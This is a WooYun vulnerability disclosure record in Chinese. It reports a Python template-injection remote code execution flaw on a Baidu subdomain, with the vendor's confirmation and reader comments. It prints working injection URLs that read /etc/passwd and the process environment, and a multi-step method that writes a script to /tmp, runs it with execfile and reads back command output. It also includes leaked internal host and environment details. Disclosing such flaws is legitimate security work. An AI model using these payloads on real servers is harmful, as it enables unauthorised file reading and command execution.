{"id": 86258, "wybug_id": "wooyun-2016-0189837", "wybug_title": "百度某站点python模板远程代码执行(在不支持多行和exec的情形执行系统命令)", "wybug_corp": "百度", "wybug_author": "lijiejie", "wybug_date": "2016-03-27 23:17", "wybug_open_date": "2016-05-11 23:20", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-11：\t细节向公众公开  简要描述： 百度某站点python模板远程代码执行, 可以执行任意python代码，进而执行任意系统命令（本例演示exec被禁的情况下执行系统命令的一种方法） 详细说明：  \nhttp://t.youhua.baidu.com/{{open('/etc/passwd').read()}}/about.html\npython模板存在代码执行，可以执行任意python脚本。   漏洞证明：  先读取passwd:\nhttp://t.youhua.baidu.com/{{open('/etc/passwd').read()}}/about.html\n\n\n再读取/proc/self/environ（不截图了），得到：\nLESSOPEN=|/usr/bin/lesspipe.sh %sCVS_RSH=sshLOGNAME=workUSER=workQTDIR=/usr/lib64/qt-3.3PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/opt/bin:/home/opt/bin:/home/work/binLANG=en_USTERM=xtermSHELL=/bin/bashSHLVL=1G_BROKEN_FILENAMES=1SUPERVISOR_ENABLED=1HISTSIZE=1000SUDO_USER=hanfeihanHOME=/home/workMODULESHOME=/usr/share/ModulesUSERNAME=workSUDO_UID=192434SUPERVISOR_PROCESS_NAME=uwsgiSUPERVISOR_SERVER_URL=unix:///home/work/lingyun/program/supervisor/run/supervisor.sock_=/home/work/lingyun/python/bin/supervisordMODULEPATH=/usr/share/Modules/modulefiles:/etc/modulefilesSUDO_COMMAND=/bin/bashSUDO_GID=100000OLDPWD=/home/work/lingyun/programHOSTNAME=gzns-scloud-fhl-lingyun02.gzns.baidu.comHISTCONTROL=ignoredupsPWD=/home/work/lingyun/program/supervisorMAIL=/var/spool/mail/workLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=01;05;37;41:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.tbz=01;31:*.tbz2=01;31:*.bz=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=01;36:*.au=01;36:*.flac=01;36:*.mid=01;36:*.midi=01;36:*.mka=01;36:*.mp3=01;36:*.mpc=01;36:*.ogg=01;36:*.ra=01;36:*.wav=01;36:*.axa=01;36:*.oga=01;36:*.spx=01;36:*.xspf=01;36:SUPERVISOR_GROUP_NAME=uwsgiUWSGI_RELOADS=125UWSGI_ORIGINAL_PROC_NAME=/home/work/lingyun/program/uwsgi/uwsgi\n可以知道，当前用户是普通用户work。读hosts:\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain610.42.7.124 api.su.baidu.com\n尝试读取/home/work/.bash_history，失败了，说明文件不存在。继续测试exec执行代码，也失败了，估计是被框架或者百度去掉了：\n\neval是可以的,然而要执行系统命令，只有eval还做不到。\n\n注意： 此处模板中是无法执行多行的,为了执行系统命令，基本的思路是先写临时文件到/tmp，然后通过execfile函数来执行，把命令执行结果输出到/tmp/output，再读取/tmp/output的内容\n写test.py: http://t.youhua.baidu.com/{{open('/tmp/test.py','w').write('import os;os.system(\"ps aux > /tmp/output\")')}}/about.html 读取test.py核对:http://t.youhua.baidu.com/{{open('/tmp/test.py').read()}}/about.html执行test.py: http://t.youhua.baidu.com/{{execfile('/tmp/test.py')}}/about.html读取output: http://t.youhua.baidu.com/{{open('/tmp/output').read()}}/about.html\n如下图所示，已经可以执行系统命令，可进一步获取系统中的源代码和敏感配置信息。\n\n   修复方案：  过滤禁止任意python代码执行   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-03-27 23:20 厂商回复： 感谢对百度安全的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-27 23:19 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  经典！    \n     2016-03-27 23:20 |    \t\tanswer  \t\t\t( 普通白帽子  |\t\t\t        Rank:453 漏洞数:54        | 答案)\t\t \n  前排    \n     2016-03-27 23:20 |    \t\t玉林嘎  \t\t\t( 普通白帽子  |\t\t\t        Rank:941 漏洞数:108        )\t\t \n  前排!    \n     2016-03-27 23:25 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:65        | 我要是再正常一点就好了)\t\t \n  qianpai    \n     2016-03-27 23:26 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:244 漏洞数:91        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  前排。。    \n     2016-03-27 23:38 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1547 漏洞数:216        | 。)\t\t \n  支持os吗？    \n     2016-03-27 23:42 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:573 漏洞数:74        | http://weibo.com/fds1986)\t\t \n  卧槽,姐姐真厉害    \n     2016-03-28 00:43 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1712 漏洞数:261        )\t\t \n  前排。    \n     2016-03-28 08:27 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:556 漏洞数:126        | 我是突突兔！)\t\t \n  引入模块？    \n     2016-03-28 09:13 |    \t\tRand0m \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        | 竟然还有人冒充我，醉了，骗子QQ：44569754...)\t\t \n  现在还算前排吗    \n     2016-03-28 10:24 |    \t\tCyrils \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:11        | the more the better)\t\t \n  jinja?    \n     2016-03-29 22:26 |    \t\tLaTCue \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:29        | 满脑子的艺术细菌，当然，是人体艺术。)\t\t \n  我要做第一百个关注者    \n     2016-04-27 18:09 |    \t\tnull_z \t\t\t( 普通白帽子  |\t\t\t        Rank:973 漏洞数:111        | AlphaGo)\t\t \n  这真心应该来个雷啊！    \n     2016-04-27 18:23 |    \t\tsysALong \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:72        | 在我们黑龙江这噶哒，就没有什么事是【撸串...)\t\t \n  杰杰能说说為甚麼你知道它可以执行python代码的呢？    \n     2016-04-27 19:46 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:674 漏洞数:136        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  .....没用过模板 完全不知道原因、    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}